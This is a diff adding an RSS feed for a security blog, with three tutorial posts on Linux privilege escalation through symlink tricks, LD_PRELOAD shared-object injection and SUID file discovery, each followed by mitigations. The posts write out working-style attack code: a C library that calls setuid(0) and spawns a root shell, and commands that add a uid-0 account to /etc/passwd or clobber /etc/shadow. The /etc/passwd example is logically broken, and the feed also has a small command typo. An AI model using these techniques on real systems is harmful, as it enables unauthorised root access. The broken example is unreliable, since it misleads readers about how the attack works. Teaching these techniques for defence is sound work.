@@ -1,0 +1,394 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SUID on Zerodex Blog</title><link>https://zerodex1.github.io/tags/suid/</link><description>Recent content in SUID on Zerodex Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 30 Jan 2025 17:41:45 +0000</lastBuildDate><atom:link href="https://zerodex1.github.io/tags/suid/index.xml" rel="self" type="application/rss+xml"/><item><title>Binary Symlinks</title><link>https://zerodex1.github.io/p/binary-symlinks/</link><pubDate>Thu, 30 Jan 2025 17:41:45 +0000</pubDate><guid>https://zerodex1.github.io/p/binary-symlinks/</guid><description>&lt;img src="https://zerodex1.github.io/post/binary.jpg" alt="Featured image of post Binary Symlinks" />&lt;h3 id="binary-symlink-privilege-escalation">&lt;strong>Binary Symlink Privilege Escalation&lt;/strong>
+&lt;/h3>&lt;p>Binary symlink privilege escalation is a technique where an attacker abuses symbolic links (symlinks) to trick a privileged program into executing malicious code or performing unintended actions with elevated privileges. This type of attack often targets misconfigured or insecurely coded scripts or binaries that execute with higher privileges, such as &lt;code>root&lt;/code>.&lt;/p>
+&lt;hr>
+&lt;h3 id="how-it-works">&lt;strong>How It Works&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Understanding Symlinks&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>A symlink is a file that points to another file or directory.&lt;/li>
+&lt;li>For example:
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ln -s /path/to/target /path/to/symlink
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Privilege Escalation via Symlinks&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>An attacker creates a symlink pointing to a malicious binary or file.&lt;/li>
+&lt;li>A privileged program inadvertently interacts with the symlink, allowing the attacker to manipulate the file or execute code with elevated privileges.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h3 id="scenarios-for-exploiting-symlinks">&lt;strong>Scenarios for Exploiting Symlinks&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Writable Directories in Privileged Context&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>If a privileged program creates or interacts with files in a directory writable by unprivileged users, an attacker can replace those files with symlinks pointing to sensitive locations like &lt;code>/etc/passwd&lt;/code>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Temporary File Vulnerabilities&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Programs that create temporary files without securely checking their existence are susceptible to symlink attacks.&lt;/li>
+&lt;li>Example:
+&lt;ul>
+&lt;li>A script creates a temporary file &lt;code>/tmp/somefile&lt;/code> without checking if it already exists.&lt;/li>
+&lt;li>The attacker creates a symlink &lt;code>/tmp/somefile&lt;/code> pointing to &lt;code>/etc/shadow&lt;/code>.&lt;/li>
+&lt;li>When the privileged program writes to &lt;code>/tmp/somefile&lt;/code>, it overwrites &lt;code>/etc/shadow&lt;/code>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Replacing Binaries&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>If a privileged service or cron job executes a script from a writable directory, an attacker can replace it with a symlink pointing to a malicious script.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h3 id="practical-example">&lt;strong>Practical Example&lt;/strong>
+&lt;/h3>&lt;h4 id="1-symlink-attack-to-modify-etcpasswd">1. Symlink Attack to Modify &lt;code>/etc/passwd&lt;/code>
+&lt;/h4>&lt;ul>
+&lt;li>
+&lt;p>Assume a root script copies a file to &lt;code>/etc/passwd&lt;/code> without checking its destination:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cp /tmp/userfile /etc/passwd
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Exploitation:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ln -s /etc/passwd /tmp/userfile
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;malicious_entry:x:0:0:root:/root:/bin/bash&amp;#34;&lt;/span> &amp;gt;&amp;gt; /tmp/userfile
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>When the script runs, the symlink redirects &lt;code>/tmp/userfile&lt;/code> to &lt;code>/etc/passwd&lt;/code>, adding the malicious entry with root privileges.&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h4 id="2-temporary-file-exploitation">2. Temporary File Exploitation
+&lt;/h4>&lt;ul>
+&lt;li>
+&lt;p>A root-owned script writes logs to &lt;code>/tmp/log.txt&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;System Log&amp;#34;&lt;/span> &amp;gt; /tmp/log.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Exploitation:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ln -s /etc/shadow /tmp/log.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>The script overwrites &lt;code>/etc/shadow&lt;/code>, potentially corrupting it or injecting malicious content.&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="mitigations">&lt;strong>Mitigations&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Secure Temporary File Creation&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Use secure functions like &lt;code>mktemp&lt;/code> to create unique temporary files.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">temp_file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>mktemp&lt;span class="k">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Secure Data&amp;#34;&lt;/span> &amp;gt; &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$temp_file&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Validate Symlinks&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Use the &lt;code>O_NOFOLLOW&lt;/code> flag when opening files to avoid following symlinks:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/tmp/file&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">O_WRONLY&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">O_CREAT&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">O_NOFOLLOW&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Restrict Permissions&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Ensure sensitive directories and files are not writable by unprivileged users.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>For example, &lt;code>/tmp&lt;/code> should have the &lt;code>sticky&lt;/code> bit set:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">chmod +t /tmp
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Avoid Privileged Actions on User-Controlled Files&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Avoid executing privileged operations on files in user-writable locations.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Monitor and Audit&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Regularly monitor for suspicious symlinks in writable directories using tools like &lt;code>find&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">find /tmp -type l -ls
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr></description></item><item><title>Shared Object Injection</title><link>https://zerodex1.github.io/p/shared-object-injection/</link><pubDate>Sun, 26 Jan 2025 13:50:55 +0000</pubDate><guid>https://zerodex1.github.io/p/shared-object-injection/</guid><description>&lt;img src="https://zerodex1.github.io/post/suid.jpg" alt="Featured image of post Shared Object Injection" />&lt;h3 id="shared-object-injection-for-privilege-escalation">&lt;strong>Shared Object Injection for Privilege Escalation&lt;/strong>
+&lt;/h3>&lt;p>&lt;strong>Shared Object (SO) injection&lt;/strong> is a technique where an attacker forces a process to load a malicious shared library (.so file) into its memory. When executed, the malicious code in the library runs with the privileges of the target process, potentially leading to privilege escalation if the process has higher privileges (e.g., root).&lt;/p>
+&lt;hr>
+&lt;h3 id="how-shared-object-injection-works">&lt;strong>How Shared Object Injection Works&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Shared Libraries in Linux&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Linux dynamically links shared libraries (&lt;code>.so&lt;/code> files) at runtime.&lt;/li>
+&lt;li>Applications specify required libraries in their code, and the system&amp;rsquo;s &lt;strong>dynamic linker&lt;/strong> loads them when the application starts.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Manipulating Library Loading&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Attackers can exploit library loading mechanisms, such as modifying environment variables (&lt;code>LD_PRELOAD&lt;/code>, &lt;code>LD_LIBRARY_PATH&lt;/code>), or targeting programs that improperly handle library paths.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Privilege Escalation&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>If an attacker can make a root-owned process load their malicious &lt;code>.so&lt;/code> file, they can execute arbitrary code as root.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h3 id="techniques-for-shared-object-injection">&lt;strong>Techniques for Shared Object Injection&lt;/strong>
+&lt;/h3>&lt;h4 id="1-using-ld_preload">1. &lt;strong>Using &lt;code>LD_PRELOAD&lt;/code>&lt;/strong>:
+&lt;/h4>&lt;ul>
+&lt;li>
+&lt;p>The &lt;code>LD_PRELOAD&lt;/code> environment variable allows users to specify additional shared libraries to be loaded before any others.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Exploit scenario:&lt;/p>
+&lt;ul>
+&lt;li>A program with &lt;code>sudo&lt;/code> permissions does not sanitize environment variables.&lt;/li>
+&lt;li>The attacker sets &lt;code>LD_PRELOAD&lt;/code> to point to their malicious &lt;code>.so&lt;/code> file.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>Example:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s1">&amp;#39;void _init() { setuid(0); system(&amp;#34;/bin/bash&amp;#34;); }&amp;#39;&lt;/span> &amp;gt; exploit.c
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gcc -shared -fPIC -o exploit.so exploit.c
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">LD_PRELOAD&lt;/span>&lt;span class="o">=&lt;/span>./exploit.so sudo some-command
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h4 id="2-hijacking-ld_library_path">2. &lt;strong>Hijacking &lt;code>LD_LIBRARY_PATH&lt;/code>&lt;/strong>:
+&lt;/h4>&lt;ul>
+&lt;li>
+&lt;p>&lt;code>LD_LIBRARY_PATH&lt;/code> specifies directories for the linker to search for shared libraries.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Exploit scenario:&lt;/p>
+&lt;ul>
+&lt;li>The attacker modifies &lt;code>LD_LIBRARY_PATH&lt;/code> to include a directory containing malicious libraries.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>Example:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">LD_LIBRARY_PATH&lt;/span>&lt;span class="o">=&lt;/span>/tmp/malicious:&lt;span class="nv">$LD_LIBRARY_PATH&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h4 id="3-replacing-legitimate-libraries">3. &lt;strong>Replacing Legitimate Libraries&lt;/strong>:
+&lt;/h4>&lt;ul>
+&lt;li>Replace a shared library on the system with a malicious one.&lt;/li>
+&lt;li>Exploit scenario:
+&lt;ul>
+&lt;li>Insufficient file permissions allow an attacker to overwrite a &lt;code>.so&lt;/code> file used by a privileged program.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h4 id="4-dynamic-linking-exploits">4. &lt;strong>Dynamic Linking Exploits&lt;/strong>:
+&lt;/h4>&lt;ul>
+&lt;li>Exploit applications that dynamically load libraries during execution using functions like &lt;code>dlopen()&lt;/code> or &lt;code>dlsym()&lt;/code>.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="example-privilege-escalation-using-ld_preload">&lt;strong>Example: Privilege Escalation Using LD_PRELOAD&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Create a Malicious Shared Object&lt;/strong>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="nf">_init&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setuid&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// Set the UID to root
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/bin/bash&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// Spawn a root shell
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Save this as &lt;code>exploit.c&lt;/code> and compile:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">gcc -fPIC -shared -o exploit.so exploit.c
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Set LD_PRELOAD&lt;/strong>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">LD_PRELOAD&lt;/span>&lt;span class="o">=&lt;/span>/path/to/exploit.so sudo some-command
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Result&lt;/strong>: A root shell is spawned if the target process is vulnerable.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h3 id="mitigations-against-so-injection">&lt;strong>Mitigations Against SO Injection&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Disable &lt;code>LD_PRELOAD&lt;/code> for SUID Programs&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Modern Linux systems ignore &lt;code>LD_PRELOAD&lt;/code> for SUID binaries to prevent this type of attack.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Restrict &lt;code>LD_LIBRARY_PATH&lt;/code>&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Limit the use of custom library paths in privileged programs.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Secure File Permissions&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Ensure shared libraries are owned by root and are not writable by unprivileged users.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Use Static Linking&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>For critical programs, avoid dynamic linking altogether.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Audit Programs&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Identify and fix applications that dynamically load libraries without proper checks.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol></description></item><item><title>SUID Attacks</title><link>https://zerodex1.github.io/p/suid-attacks/</link><pubDate>Sun, 26 Jan 2025 12:47:23 +0000</pubDate><guid>https://zerodex1.github.io/p/suid-attacks/</guid><description>&lt;img src="https://zerodex1.github.io/post/coversuid.jpg" alt="Featured image of post SUID Attacks" />&lt;h1 id="what-is-suid">What is SUID?
+&lt;/h1>&lt;p>&lt;strong>Definition:&lt;/strong> SUID (Set owner User ID up on execution) is a special permission that allows other users run with the owner’s privileges. That’s why SUID files can be exploited to give adversaries the higher privilege in Linux/Unix system called privilege escalation. Mostly, &lt;strong>root&lt;/strong> access is the goal of hackers when performing privilege escalation.&lt;/p>
+&lt;h2 id="techniques-">Techniques :
+&lt;/h2>&lt;ul>
+&lt;li>Shared Object Injection&lt;/li>
+&lt;li>Binary Symlinks&lt;/li>
+&lt;li>Environment Variables&lt;/li>
+&lt;/ul>
+&lt;h2 id="how-to-find-the-suid-files">How to find the SUID files
+&lt;/h2>&lt;p>The following command will list all of the SUID files in the system&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl"> find / -perm -u&lt;span class="o">=&lt;/span>s -type f 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>&lt;code>find&lt;/code>: a Linux command to search for files in a directory hierarchy&lt;/li>
+&lt;li>&lt;code>-perm&lt;/code>: is used to define the permissions to search for&lt;/li>
+&lt;li>&lt;code>-u=s&lt;/code>: search for files with the SUID permission&lt;/li>
+&lt;li>&lt;code>-type f&lt;/code>: search for regular file&lt;/li>
+&lt;li>&lt;code>2&amp;gt;dev/nul&lt;/code>l: errors will be deleted automatically&lt;/li>
+&lt;/ul></description></item></channel></rss>
